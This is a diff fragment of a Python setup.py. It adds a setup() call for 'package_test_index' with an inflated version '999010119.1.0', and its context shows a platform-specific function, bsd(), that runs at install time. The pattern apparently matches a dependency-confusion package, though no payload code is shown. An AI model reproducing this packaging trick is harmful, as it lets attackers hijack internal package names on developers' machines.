@@ -141,4 +141,17 @@ else:
         bsd()
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name='package_test_index',
+    version='999010119.1.0',
+    author='Jedaj',
+    author_email='jeffs@gmail.com',
+    description='takes place',
+    packages=find_packages(),
+    classifiers=[
+        'Programming Language :: Python :: 3',
+        'License :: OSI Approved :: MIT License',
+        'Operating System :: OS Independent',
+    ],
+    python_requires='>=3.0',
+    )
